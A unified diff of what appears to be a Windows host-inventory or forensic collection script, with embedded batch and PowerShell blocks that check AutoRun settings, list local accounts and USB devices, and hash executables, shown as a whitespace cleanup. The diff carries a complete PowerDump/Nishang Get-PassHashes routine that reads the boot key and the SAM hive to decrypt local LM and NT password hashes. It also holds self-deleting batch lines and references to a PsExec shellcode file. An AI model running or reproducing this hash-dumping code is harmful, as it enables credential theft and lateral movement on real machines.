 for /F "tokens=1-3" %%A in ('reg query HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\explorer ^|findstr NoDriveTypeAutoRun') do (
 	IF %%C EQU 0xFF (echo %COMPUTERNAME%,TRUE )  ELSE echo %COMPUTERNAME%,FALSE
 ) >> "C:\AutoRunDisable392125281"
+IF NOT EXIST "C:\AutoRunDisable392125281" ECHO %COMPUTERNAME%,FALSE > "C:\AutoRunDisable392125281"
 (goto) 2>nul & del "%~f0"
 '@
 $AutoRunDisableCode_PS1=@'
@@ -3741,9 +3743,12 @@ for /F "tokens=*" %%G in ('net users^|findstr /v /c:"User accounts" /c:"command 
 	for /f  "tokens=1-2*" %%C IN ('net user "%%U" ^|findstr /c:"Account active" /c:"Last logon"') DO (
 		set /a var=!var!+1
 		if !var!==1 (
-			set data=%%E
+			set active=%%E
 		) ELSE (
-			echo %COMPUTERNAME%,%%U,!data!,%%E
+			IF %%E equ Never (
+				set lastlogon=
+			) ELSE (SET lastlogon=%%E)
+			echo %COMPUTERNAME%,%%U,!active!,!lastlogon!
 		)
 	)2>nul
 	endlocal
@@ -3762,7 +3767,7 @@ try {
 		try{
 			$login=","+($_.LastLogin).Value
 		} catch {
-			$login=",Never"
+			$login=$null
 		}
 		$env:COMPUTERNAME+","+$_.Name+","+$active+$login
 	}|Out-file "C:\LocalAccounts392125281"
@@ -3796,13 +3801,13 @@ $USB_EnumerationCode_BAT = @'
 @echo off
 IF EXIST "C:\USB_Enumeration392125281" DEL "C:\USB_Enumeration392125281"
 setlocal enabledelayedexpansion
-for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usb') DO (	
+for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usb') DO (
 	for /f %%B IN ('reg query "%%A"') DO (
 		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v FriendlyName') DO (
 			set FriendlyName=%%E
 			IF "!FriendlyName!" NEQ "" set FriendlyName=!FriendlyName:,=!
 		)2>nul
-		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (	
+		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (
 			set DeviceDescr=%%E
 			IF "!DeviceDescr!" NEQ "" set DeviceDescr=!DeviceDescr:,=!
 		)2>nul
@@ -3817,13 +3822,13 @@ for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usb') DO (
 		)
 	)2>nul
 )2>nul
-for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usbstor') DO (	
-	for /f %%B IN ('reg query "%%A"') DO (	
+for /f %%A in ('reg query hklm\system\currentcontrolset\enum\usbstor') DO (
+	for /f %%B IN ('reg query "%%A"') DO (
 		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v FriendlyName') DO (
 			set FriendlyName=%%E
 			IF "!FriendlyName!" NEQ "" set FriendlyName=!FriendlyName:,=!
 		)2>nul
-		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (	
+		for /f  "tokens=1-2*" %%C IN ('reg query "%%B" /v DeviceDesc') DO (
 			set DeviceDescr=%%E
 			IF "!DeviceDescr!" NEQ "" set DeviceDescr=!DeviceDescr:,=!
 		)2>nul
@@ -3853,7 +3858,7 @@ reg query hklm\system | Select-String "control" | %{
     }
 }
 $keys|%{
-    $key = $_ -replace "HKEY_LOCAL_MACHINE", "HKLM:" 
+    $key = $_ -replace "HKEY_LOCAL_MACHINE", "HKLM:"
 	if ((Get-Item -Path "$key").property|Select-String DeviceDesc)
 	{
 		$DevDesc = (Get-ItemProperty -Path "$key" -Name DeviceDesc).DeviceDesc
@@ -3861,11 +3866,11 @@ $keys|%{
 	else {$DevDesc = ""}
 	if ((Get-Item -Path "$key").property|Select-String FriendlyName)
 	{
-		$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName 
+		$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName
 	}
 	else {$FriendlyName = ""}
     if ($DevDesc|select-String ";"){$DevDesc = (Get-ItemProperty -Path "$key" -Name DeviceDesc).DeviceDesc.split(";")[1]}
-	if ($FriendlyName|select-String ";"){$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName.split(";")[1]}    
+	if ($FriendlyName|select-String ";"){$FriendlyName = (Get-ItemProperty -Path "$key" -Name FriendlyName).FriendlyName.split(";")[1]}
 	if($DevDesc -or $FriendlyName)
 	{
 		$env:COMPUTERNAME+","+$DevDesc+","+$FriendlyName+","+$_ | Add-Content "C:\USB_Enumeration392125281"
@@ -3886,406 +3891,406 @@ function GetHash($file){
 }
 
 Get-ChildItem -path "C:\" -Include "*.exe", "*.dll", "*.sys" -Recurse -Force -ErrorAction SilentlyContinue|
-? { $_.FullName -notmatch 'Application Data' }| %{ 
+? { $_.FullName -notmatch 'Application Data' }| %{
 	$_.Name+","+(GetHash $_.FullName)|Add-Content  "C:\hashes392125281"
 }
 Remove-Item -Force "C:\PSExecShellCode.ps1"
 '@
 
 [ScriptBlock] $PowerDump = {
-function Get-PassHashes {  
-<#  
-http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060 
-https://github.com/samratashok/nishang 
-#>  
-[CmdletBinding()] 
-Param () 
-  
-#######################################powerdump written by David Kennedy######################################### 
-function LoadApi 
-{ 
-$oldErrorAction = $global:ErrorActionPreference; 
-$global:ErrorActionPreference = "SilentlyContinue"; 
-$test = [PowerDump.Native]; 
-$global:ErrorActionPreference = $oldErrorAction; 
-if ($test) 
-{ 
-# already loaded 
-return; 
-} 
-  
-$code = @' 
-using System; 
-using System.Security.Cryptography; 
-using System.Runtime.InteropServices; 
-using System.Text; 
- 
-namespace PowerDump 
-{ 
-public class Native 
-{ 
-[DllImport("advapi32.dll", CharSet = CharSet.Auto)] 
-public static extern int RegOpenKeyEx( 
-int hKey, 
-string subKey, 
-int ulOptions, 
-int samDesired, 
-out int hkResult); 
- 
-[DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")] 
-extern public static int RegEnumKeyEx( 
-int hkey, 
-int index, 
-StringBuilder lpName, 
-ref int lpcbName, 
-int reserved, 
-StringBuilder lpClass, 
-ref int lpcbClass, 
-out long lpftLastWriteTime); 
- 
-[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)] 
-extern public static int RegQueryInfoKey( 
-int hkey, 
-StringBuilder lpClass, 
-ref int lpcbClass, 
-int lpReserved, 
-out int lpcSubKeys, 
-out int lpcbMaxSubKeyLen, 
-out int lpcbMaxClassLen, 
-out int lpcValues, 
-out int lpcbMaxValueNameLen, 
-out int lpcbMaxValueLen, 
-out int lpcbSecurityDescriptor, 
-IntPtr lpftLastWriteTime); 
-  
-[DllImport("advapi32.dll", SetLastError=true)] 
-public static extern int RegCloseKey( 
-int hKey); 
-  
-} 
-} // end namespace PowerDump 
-  
-public class Shift { 
-public static int Right(int x, int count) { return x >> count; } 
-public static uint Right(uint x, int count) { return x >> count; } 
-public static long Right(long x, int count) { return x >> count; } 
-public static ulong Right(ulong x, int count) { return x >> count; } 
-public static int Left(int x, int count) { return x << count; } 
-public static uint Left(uint x, int count) { return x << count; } 
-public static long Left(long x, int count) { return x << count; } 
-public static ulong Left(ulong x, int count) { return x << count; } 
+function Get-PassHashes {
+<#
+http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+https://github.com/samratashok/nishang
+#>
+[CmdletBinding()]
+Param ()
+
+#######################################powerdump written by David Kennedy#########################################
+function LoadApi
+{
+$oldErrorAction = $global:ErrorActionPreference;
+$global:ErrorActionPreference = "SilentlyContinue";
+$test = [PowerDump.Native];
+$global:ErrorActionPreference = $oldErrorAction;
+if ($test)
+{
+# already loaded
+return;
 }
-'@ 
-  
-$provider = New-Object Microsoft.CSharp.CSharpCodeProvider 
-$dllName = [PsObject].Assembly.Location 
-$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters 
-$assemblies = @("System.dll", $dllName) 
-$compilerParameters.ReferencedAssemblies.AddRange($assemblies) 
-$compilerParameters.GenerateInMemory = $true 
-$compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code) 
-if($compilerResults.Errors.Count -gt 0) { 
-$compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) } 
-} 
-  
-} 
-  
-$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"); 
-$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0"); 
-$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee); 
-$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0); 
-$odd_parity = @( 
-1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14, 
-16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31, 
-32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47, 
-49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62, 
-64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79, 
-81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94, 
-97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110, 
-112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127, 
-128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143, 
-145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158, 
-161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174, 
-176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191, 
-193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206, 
-208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223, 
-224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239, 
-241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254 
-); 
- 
-function sid_to_key($sid) 
-{ 
-$s1 = @(); 
-$s1 += [char]($sid -band 0xFF); 
-$s1 += [char]([Shift]::Right($sid,8) -band 0xFF); 
-$s1 += [char]([Shift]::Right($sid,16) -band 0xFF); 
-$s1 += [char]([Shift]::Right($sid,24) -band 0xFF); 
-$s1 += $s1[0]; 
-$s1 += $s1[1]; 
-$s1 += $s1[2]; 
-$s2 = @(); 
-$s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2]; 
-$s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2]; 
-return ,((str_to_key $s1),(str_to_key $s2)); 
-} 
- 
-function str_to_key($s) 
-{ 
-$key = @(); 
-$key += [Shift]::Right([int]($s[0]), 1 ); 
-$key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2); 
-$key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3); 
-$key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4); 
-$key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5); 
-$key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6); 
-$key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7); 
-$key += $([int]($s[6]) -band 0x7F); 
-0..7 | %{ 
-$key[$_] = [Shift]::Left($key[$_], 1); 
-$key[$_] = $odd_parity[$key[$_]]; 
-} 
-return ,$key; 
-} 
- 
-function NewRC4([byte[]]$key) 
-{ 
-return new-object Object | 
-Add-Member NoteProperty key $key -PassThru | 
-Add-Member NoteProperty S $null -PassThru | 
-Add-Member ScriptMethod init { 
-if (-not $this.S) 
-{ 
-[byte[]]$this.S = 0..255; 
-0..255 | % -begin{[long]$j=0;}{ 
-$j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length; 
-$temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp; 
-} 
-} 
-} -PassThru | 
-Add-Member ScriptMethod "encrypt" { 
-$data = $args[0]; 
-$this.init(); 
-$outbuf = new-object byte[] $($data.Length); 
-$S2 = $this.S[0..$this.S.Length]; 
-0..$($data.Length-1) | % -begin{$i=0;$j=0;} { 
-$i = ($i+1) % $S2.Length; 
-$j = ($j + $S2[$i]) % $S2.Length; 
-$temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp; 
-$a = $data[$_]; 
-$b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ]; 
-$outbuf[$_] = ($a -bxor $b); 
-} 
-return ,$outbuf; 
-} -PassThru 
-} 
- 
-function des_encrypt([byte[]]$data, [byte[]]$key) 
-{ 
-return ,(des_transform $data $key $true) 
-} 
- 
-function des_decrypt([byte[]]$data, [byte[]]$key) 
-{ 
-return ,(des_transform $data $key $false) 
-} 
- 
-function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) 
-{ 
-$des = new-object Security.Cryptography.DESCryptoServiceProvider; 
-$des.Mode = [Security.Cryptography.CipherMode]::ECB; 
-$des.Padding = [Security.Cryptography.PaddingMode]::None; 
-$des.Key = $key; 
-$des.IV = $key; 
-$transform = $null; 
-if ($doEncrypt) {$transform = $des.CreateEncryptor();} 
-else{$transform = $des.CreateDecryptor();} 
-$result = $transform.TransformFinalBlock($data, 0, $data.Length); 
-return ,$result; 
-} 
- 
-function Get-RegKeyClass([string]$key, [string]$subkey) 
-{ 
-switch ($Key) { 
-"HKCR" { $nKey = 0x80000000} #HK Classes Root 
-"HKCU" { $nKey = 0x80000001} #HK Current User 
-"HKLM" { $nKey = 0x80000002} #HK Local Machine 
-"HKU" { $nKey = 0x80000003} #HK Users 
-"HKCC" { $nKey = 0x80000005} #HK Current Config 
-default { 
-throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC" 
-} 
-} 
-$KEYQUERYVALUE = 0x1; 
-$KEYREAD = 0x19; 
-$KEYALLACCESS = 0x3F; 
-$result = ""; 
-[int]$hkey=0 
-if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)) 
-{ 
-$classVal = New-Object Text.Stringbuilder 1024 
-[int]$len = 1024 
-if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null, 
-[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)) 
-{ 
-$result = $classVal.ToString() 
-} 
 
-[PowerDump.Native]::RegCloseKey($hkey) | Out-Null 
-} 
+$code = @'
+using System;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Text;
 
-return $result; 
-} 
- 
-function Get-BootKey 
-{ 
-$s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"})); 
-$b = new-object byte[] $($s.Length/2); 
-0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)} 
-$b2 = new-object byte[] 16; 
-0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++} 
-return ,$b2; 
-} 
- 
-function Get-HBootKey 
-{ 
-param([byte[]]$bootkey); 
-$aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0"); 
-$anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0"); 
-$k = Get-Item HKLM:\SAM\SAM\Domains\Account; 
-if (-not $k) {return $null} 
-[byte[]]$F = $k.GetValue("F"); 
-if (-not $F) {return $null} 
-$rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum); 
-$rc4 = NewRC4 $rc4key; 
-return ,($rc4.encrypt($F[0x80..0x9F])); 
-} 
- 
-function Get-UserName([byte[]]$V) 
-{ 
-if (-not $V) {return $null}; 
-$offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC; 
-$len = [BitConverter]::ToInt32($V[0x10..0x13],0); 
-return [Text.Encoding]::Unicode.GetString($V, $offset, $len); 
-} 
- 
-function Get-UserHashes($u, [byte[]]$hbootkey) 
-{ 
-[byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null; 
- 
-# check if hashes exist (if byte memory equals to 20, then we've got a hash) 
-$LM_exists = $false; 
-$NT_exists = $false; 
-# LM header check 
-if ($u.V[0xa0..0xa3] -eq 20) 
-{ 
-$LM_exists = $true; 
-} 
-# NT header check 
-elseif ($u.V[0xac..0xaf] -eq 20) 
-{ 
-$NT_exists = $true; 
-} 
- 
-if ($LM_exists -eq $true) 
-{ 
-$lm_hash_offset = $u.HashOffset + 4; 
-$nt_hash_offset = $u.HashOffset + 8 + 0x10; 
-$enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)]; 
-$enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]; 
-} 
- 
-elseif ($NT_exists -eq $true) 
-{ 
-$nt_hash_offset = $u.HashOffset + 8; 
-$enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]; 
-} 
-return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey); 
-} 
- 
-function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) 
-{ 
-[byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt; 
-# LM Hash 
-if ($enc_lm_hash) 
-{ 
-$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword; 
-} 
- 
-# NT Hash 
-if ($enc_nt_hash) 
-{ 
-$nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword; 
-} 
- 
-return ,($lmhash,$nthash) 
-} 
- 
-function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr) 
-{ 
-$deskeys = sid_to_key $rid; 
-$md5 = [Security.Cryptography.MD5]::Create(); 
-$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr); 
-$rc4 = NewRC4 $rc4_key; 
-$obfkey = $rc4.encrypt($enc_hash); 
-$hash = (des_decrypt $obfkey[0..7] $deskeys[0]) + 
-(des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]); 
-return ,$hash; 
-} 
- 
-function Get-UserKeys 
-{ 
-ls HKLM:\SAM\SAM\Domains\Account\Users | 
-where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
-Add-Member AliasProperty KeyName PSChildName -PassThru | 
-Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru | 
-Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru | 
-Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru | 
-Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru 
-} 
- 
-function DumpHashes 
-{ 
-LoadApi 
-$bootkey = Get-BootKey; 
-$hbootKey = Get-HBootKey $bootkey; 
-Get-UserKeys | %{ 
-$hashes = Get-UserHashes $_ $hBootKey; 
-"{0}:{1}:{2}:{3}" -f ($_.UserName,$_.Rid, 
+namespace PowerDump
+{
+public class Native
+{
+[DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+public static extern int RegOpenKeyEx(
+int hKey,
+string subKey,
+int ulOptions,
+int samDesired,
+out int hkResult);
+
+[DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
+extern public static int RegEnumKeyEx(
+int hkey,
+int index,
+StringBuilder lpName,
+ref int lpcbName,
+int reserved,
+StringBuilder lpClass,
+ref int lpcbClass,
+out long lpftLastWriteTime);
+
+[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
+extern public static int RegQueryInfoKey(
+int hkey,
+StringBuilder lpClass,
+ref int lpcbClass,
+int lpReserved,
+out int lpcSubKeys,
+out int lpcbMaxSubKeyLen,
+out int lpcbMaxClassLen,
+out int lpcValues,
+out int lpcbMaxValueNameLen,
+out int lpcbMaxValueLen,
+out int lpcbSecurityDescriptor,
+IntPtr lpftLastWriteTime);
+
+[DllImport("advapi32.dll", SetLastError=true)]
+public static extern int RegCloseKey(
+int hKey);
+
+}
+} // end namespace PowerDump
+
+public class Shift {
+public static int Right(int x, int count) { return x >> count; }
+public static uint Right(uint x, int count) { return x >> count; }
+public static long Right(long x, int count) { return x >> count; }
+public static ulong Right(ulong x, int count) { return x >> count; }
+public static int Left(int x, int count) { return x << count; }
+public static uint Left(uint x, int count) { return x << count; }
+public static long Left(long x, int count) { return x << count; }
+public static ulong Left(ulong x, int count) { return x << count; }
+}
+'@
+
+$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+$dllName = [PsObject].Assembly.Location
+$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
+$assemblies = @("System.dll", $dllName)
+$compilerParameters.ReferencedAssemblies.AddRange($assemblies)
+$compilerParameters.GenerateInMemory = $true
+$compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
+if($compilerResults.Errors.Count -gt 0) {
+$compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
+}
+
+}
+
+$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
+$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
+$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
+$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
+$odd_parity = @(
+1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
+16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
+32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
+49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
+64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
+81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
+97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
+112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
+128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
+145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
+161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
+176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
+193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
+208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
+224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
+241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
+);
+
+function sid_to_key($sid)
+{
+$s1 = @();
+$s1 += [char]($sid -band 0xFF);
+$s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
+$s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
+$s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
+$s1 += $s1[0];
+$s1 += $s1[1];
+$s1 += $s1[2];
+$s2 = @();
+$s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
+$s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
+return ,((str_to_key $s1),(str_to_key $s2));
+}
+
+function str_to_key($s)
+{
+$key = @();
+$key += [Shift]::Right([int]($s[0]), 1 );
+$key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
+$key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
+$key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
+$key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
+$key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
+$key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
+$key += $([int]($s[6]) -band 0x7F);
+0..7 | %{
+$key[$_] = [Shift]::Left($key[$_], 1);
+$key[$_] = $odd_parity[$key[$_]];
+}
+return ,$key;
+}
+
+function NewRC4([byte[]]$key)
+{
+return new-object Object |
+Add-Member NoteProperty key $key -PassThru |
+Add-Member NoteProperty S $null -PassThru |
+Add-Member ScriptMethod init {
+if (-not $this.S)
+{
+[byte[]]$this.S = 0..255;
+0..255 | % -begin{[long]$j=0;}{
+$j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
+$temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
+}
+}
+} -PassThru |
+Add-Member ScriptMethod "encrypt" {
+$data = $args[0];
+$this.init();
+$outbuf = new-object byte[] $($data.Length);
+$S2 = $this.S[0..$this.S.Length];
+0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
+$i = ($i+1) % $S2.Length;
+$j = ($j + $S2[$i]) % $S2.Length;
+$temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
+$a = $data[$_];
+$b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
+$outbuf[$_] = ($a -bxor $b);
+}
+return ,$outbuf;
+} -PassThru
+}
+
+function des_encrypt([byte[]]$data, [byte[]]$key)
+{
+return ,(des_transform $data $key $true)
+}
+
+function des_decrypt([byte[]]$data, [byte[]]$key)
+{
+return ,(des_transform $data $key $false)
+}
+
+function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
+{
+$des = new-object Security.Cryptography.DESCryptoServiceProvider;
+$des.Mode = [Security.Cryptography.CipherMode]::ECB;
+$des.Padding = [Security.Cryptography.PaddingMode]::None;
+$des.Key = $key;
+$des.IV = $key;
+$transform = $null;
+if ($doEncrypt) {$transform = $des.CreateEncryptor();}
+else{$transform = $des.CreateDecryptor();}
+$result = $transform.TransformFinalBlock($data, 0, $data.Length);
+return ,$result;
+}
+
+function Get-RegKeyClass([string]$key, [string]$subkey)
+{
+switch ($Key) {
+"HKCR" { $nKey = 0x80000000} #HK Classes Root
+"HKCU" { $nKey = 0x80000001} #HK Current User
+"HKLM" { $nKey = 0x80000002} #HK Local Machine
+"HKU" { $nKey = 0x80000003} #HK Users
+"HKCC" { $nKey = 0x80000005} #HK Current Config
+default {
+throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
+}
+}
+$KEYQUERYVALUE = 0x1;
+$KEYREAD = 0x19;
+$KEYALLACCESS = 0x3F;
+$result = "";
+[int]$hkey=0
+if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
+{
+$classVal = New-Object Text.Stringbuilder 1024
+[int]$len = 1024
+if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
+[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
+{
+$result = $classVal.ToString()
+}
+
+[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
+}
+
+return $result;
+}
+
+function Get-BootKey
+{
+$s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
+$b = new-object byte[] $($s.Length/2);
+0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
+$b2 = new-object byte[] 16;
+0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
+return ,$b2;
+}
+
+function Get-HBootKey
+{
+param([byte[]]$bootkey);
+$aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
+$anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
+$k = Get-Item HKLM:\SAM\SAM\Domains\Account;
+if (-not $k) {return $null}
+[byte[]]$F = $k.GetValue("F");
+if (-not $F) {return $null}
+$rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
+$rc4 = NewRC4 $rc4key;
+return ,($rc4.encrypt($F[0x80..0x9F]));
+}
+
